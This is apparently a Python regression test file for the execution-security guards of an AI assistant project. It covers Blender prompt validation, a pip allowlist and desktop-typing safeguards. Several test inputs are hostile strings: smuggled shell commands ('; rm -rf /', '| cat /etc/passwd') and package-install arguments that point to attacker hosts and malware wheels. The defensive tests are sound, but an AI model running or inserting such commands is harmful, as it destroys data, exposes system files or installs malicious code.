"""
Regression tests for the three remaining execution-security risk areas.

Covers:
  1. Blender — trusted script-path containment enforcement.
  2. Blender — execute_python approval gate.
  3. Blender — prompt validation (length, metacharacters).
  4. Blender — sanitized subprocess env (no secrets).
  5. Package install — allowlist enforcement (arbitrary package rejected).
  6. Package install — URL / path injection rejection.
  7. Package install — allowed packages are NOT blocked.
  8. Desktop automation — credential-like text is blocked before typing.
  9. Desktop automation — target window mismatch prevents typing.
 10. Desktop automation — focus drift between queue and confirm is blocked.
 11. Desktop automation — cancel(token) discards the action.
 12. Desktop automation — router routes 'cancel <token>' correctly.
"""

import os
import sys
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

# ---------------------------------------------------------------------------
# Make the project importable regardless of CWD
# ---------------------------------------------------------------------------
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _import_blender_connector():
    from nexus.connectors import BlenderConnector
    return BlenderConnector()


# ===========================================================================
# 1-4  Blender hardening
# ===========================================================================

class BlenderScriptPathTests(unittest.TestCase):

    def setUp(self):
        self.connector = _import_blender_connector()

    # 1. Trusted script path - normal case executes without path error
    def test_trusted_script_path_is_accepted(self):
        """The bundled human_face.py resolves within the trusted scripts dir."""
        from nexus.connectors import _TRUSTED_BLENDER_SCRIPTS_DIR
        script = (_TRUSTED_BLENDER_SCRIPTS_DIR / "human_face.py").resolve()
        # Should NOT raise; proves relative_to() succeeds
        self.assertIsNotNone(script.relative_to(_TRUSTED_BLENDER_SCRIPTS_DIR))

    # 2. execute_python tool returns a hard rejection
    def test_execute_python_is_rejected(self):
        with patch.object(self.connector, "_executable", return_value="/fake/blender"):
            result = self.connector.execute("execute_python", {"script": "import bpy"})
        self.assertFalse(result.ok)
        self.assertIn("elevated approval", result.message)

    # 3a. Prompt validation - too long
    def test_prompt_too_long_is_rejected(self):
        with patch.object(self.connector, "_executable", return_value="/fake/blender"):
            result = self.connector.execute(
                "create_human_face", {"prompt": "A" * 600}
            )
        self.assertFalse(result.ok)
        self.assertIn("maximum length", result.message)

    # 3b. Prompt validation - shell metacharacters
    def test_prompt_with_semicolon_is_rejected(self):
        with patch.object(self.connector, "_executable", return_value="/fake/blender"):
            result = self.connector.execute(
                "create_human_face", {"prompt": "nice face; rm -rf /"}
            )
        self.assertFalse(result.ok)
        self.assertIn("disallowed characters", result.message)

    # 3c. Prompt validation - pipe character
    def test_prompt_with_pipe_is_rejected(self):
        with patch.object(self.connector, "_executable", return_value="/fake/blender"):
            result = self.connector.execute(
                "create_human_face", {"prompt": "face | cat /etc/passwd"}
            )
        self.assertFalse(result.ok)
        self.assertIn("disallowed characters", result.message)

    # 4. Sanitized env - secrets are stripped before subprocess call
    def test_sanitize_blender_env_removes_secrets(self):
        from nexus.connectors import _sanitize_blender_env
        with patch.dict(os.environ, {
            "GEMINI_API_KEY": "secret123",
            "OPENAI_SECRET": "tok_xyz",
            "NORMAL_VAR": "kept",
        }):
            env = _sanitize_blender_env()
        self.assertNotIn("GEMINI_API_KEY", env)
        self.assertNotIn("OPENAI_SECRET", env)
        self.assertIn("NORMAL_VAR", env)


# ===========================================================================
# 5-7  Package installation allowlist
# ===========================================================================

class PipInstallAllowlistTests(unittest.TestCase):

    def _call(self, pkg: str) -> bool:
        from hud.server import _pip_install
        return _pip_install(pkg)

    # 5. Arbitrary package is rejected
    def test_arbitrary_package_is_blocked(self):
        result = self._call("requests")
        self.assertFalse(result)

    def test_malicious_package_name_is_blocked(self):
        result = self._call("evil-pkg")
        self.assertFalse(result)

    # 6. URL/path injection in package arg is rejected
    def test_url_injection_is_blocked(self):
        result = self._call("https://evil.example.com/malware.whl")
        self.assertFalse(result)

    def test_git_plus_url_is_blocked(self):
        result = self._call("git+https://github.com/attacker/evil")
        self.assertFalse(result)

    def test_whl_path_is_blocked(self):
        result = self._call("./malware-1.0-py3-none-any.whl")
        self.assertFalse(result)

    def test_index_url_flag_is_blocked(self):
        result = self._call("pypdf --index-url http://evil.com/simple")
        self.assertFalse(result)

    # 7. Legitimate allowed packages are not blocked by the allowlist
    def test_pypdf_is_allowed_to_reach_pip(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        with patch("subprocess.run", return_value=mock_result) as mock_run:
            from hud.server import _pip_install
            ok = _pip_install("pypdf")
        self.assertTrue(ok)
        mock_run.assert_called()

    def test_python_pptx_is_allowed_to_reach_pip(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        with patch("subprocess.run", return_value=mock_result) as mock_run:
            from hud.server import _pip_install
            ok = _pip_install("python-pptx")
        self.assertTrue(ok)
        mock_run.assert_called()

    def test_python_docx_is_allowed_to_reach_pip(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        with patch("subprocess.run", return_value=mock_result) as mock_run:
            from hud.server import _pip_install
            ok = _pip_install("python-docx")
        self.assertTrue(ok)
        mock_run.assert_called()


# ===========================================================================
# 8-12  Desktop automation safety
# ===========================================================================

class DesktopAutomationSafetyTests(unittest.TestCase):

    def setUp(self):
        import plugins.universal_control as uc
        with uc._pending_lock:
            uc._pending.clear()

    # 8. Credential-like text is blocked
    def test_password_text_is_blocked(self):
        import plugins.universal_control as uc
        result = uc._execute("type_text", text="password=SuperSecret123")
        self.assertIn("BLOCKED", result)
        self.assertIn("credential", result.lower())

    def test_api_key_text_is_blocked(self):
        import plugins.universal_control as uc
        result = uc._execute("type_text", text="api_key=sk-abc123XYZ")
        self.assertIn("BLOCKED", result)

    def test_bearer_token_text_is_blocked(self):
        import plugins.universal_control as uc
        result = uc._execute("type_text", text="Authorization: Bearer eyJhbGciOi...")
        self.assertIn("BLOCKED", result)

    def test_normal_text_is_not_blocked(self):
        """Non-sensitive text should pass the credential check."""
        import plugins.universal_control as uc
        mock_gui = MagicMock()
        with patch.object(uc, "_pyautogui", return_value=mock_gui):
            with patch.object(uc, "_get_active_window_title", return_value=""):
                result = uc._execute("type_text", text="Hello, World!")
        self.assertIn("SUCCESS", result)

    # 9. Target-window mismatch prevents typing
    def test_wrong_active_window_blocks_typing(self):
        import plugins.universal_control as uc
        with patch.object(uc, "_get_active_window_title", return_value="task manager"):
            with patch.object(uc, "_pyautogui", return_value=MagicMock()):
                result = uc._execute("type_text", target="notepad", text="safe text")
        self.assertIn("BLOCKED", result)
        self.assertIn("Active window", result)

    def test_matching_active_window_allows_typing(self):
        import plugins.universal_control as uc
        mock_gui = MagicMock()
        with patch.object(uc, "_get_active_window_title", return_value="notepad - untitled"):
            with patch.object(uc, "_pyautogui", return_value=mock_gui):
                result = uc._execute("type_text", target="notepad", text="safe text")
        self.assertIn("SUCCESS", result)

    # 10. Focus drift between queue time and confirm time
    def test_focus_drift_blocks_confirm(self):
        import plugins.universal_control as uc
        with patch.object(uc, "_get_active_window_title", return_value="notepad - untitled"):
            result = uc.control("close_app", target="notepad")
        self.assertIn("CONFIRMATION_REQUIRED", result)
        token = result.split("[")[1].split("]")[0]

        with patch.object(uc, "_get_active_window_title", return_value="task manager"):
            confirm_result = uc.confirm(token)
        self.assertIn("BLOCKED", confirm_result)
        self.assertIn("active window has changed", confirm_result)

    def test_no_focus_drift_allows_confirm(self):
        import plugins.universal_control as uc
        with patch.object(uc, "_get_active_window_title", return_value="notepad"):
            result = uc.control("close_app", target="notepad")
        token = result.split("[")[1].split("]")[0]

        with patch.object(uc, "_get_active_window_title", return_value="notepad"):
            with patch.object(uc, "_execute", return_value="SUCCESS: closed"):
                confirm_result = uc.confirm(token)
        self.assertNotIn("BLOCKED", confirm_result)

    # 11. cancel() discards the action without executing it
    def test_cancel_discards_pending_action(self):
        import plugins.universal_control as uc
        with patch.object(uc, "_get_active_window_title", return_value=""):
            result = uc.control("close_app", target="calc")
        token = result.split("[")[1].split("]")[0]

        cancel_result = uc.cancel(token)
        self.assertIn("CANCELLED", cancel_result)
        self.assertIn("close_app", cancel_result)

        confirm_result = uc.confirm(token)
        self.assertIn("ERROR", confirm_result)
        self.assertIn("invalid", confirm_result.lower())

    def test_cancel_invalid_token_returns_error(self):
        import plugins.universal_control as uc
        result = uc.cancel("DEADBEEF")
        self.assertIn("ERROR", result)

    # 12. Router routes 'cancel <token>' to cancel()
    def test_router_cancel_route(self):
        import plugins.universal_control as uc
        from brain.router import route

        with patch.object(uc, "_get_active_window_title", return_value=""):
            result = uc.control("close_app", target="calc")
        token = result.split("[")[1].split("]")[0].lower()

        cancel_response = route(f"cancel {token}")
        self.assertIn("CANCELLED", cancel_response)

    def test_router_abort_route(self):
        import plugins.universal_control as uc
        from brain.router import route

        with patch.object(uc, "_get_active_window_title", return_value=""):
            result = uc.control("close_app", target="notepad")
        token = result.split("[")[1].split("]")[0].lower()

        abort_response = route(f"abort {token}")
        self.assertIn("CANCELLED", abort_response)


if __name__ == "__main__":
    unittest.main()
